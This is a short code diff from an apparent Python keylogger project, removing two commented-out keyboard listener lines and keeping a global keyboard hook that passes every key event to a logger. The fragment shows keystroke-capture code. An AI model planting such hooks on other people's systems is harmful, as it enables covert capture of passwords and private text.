@@ -6,8 +6,6 @@ class Keylogger:
     def __init__(self, logger: keylogger_logger._AbstractLogger):
         self.logger = logger
 
-       # keyboard.on_press(callback=self._log_keypress)
-        #keyboard.on_release(callback=self._log_keyrelease)
         keyboard.hook(callback=self._log_event)
 
     def __del__(self):
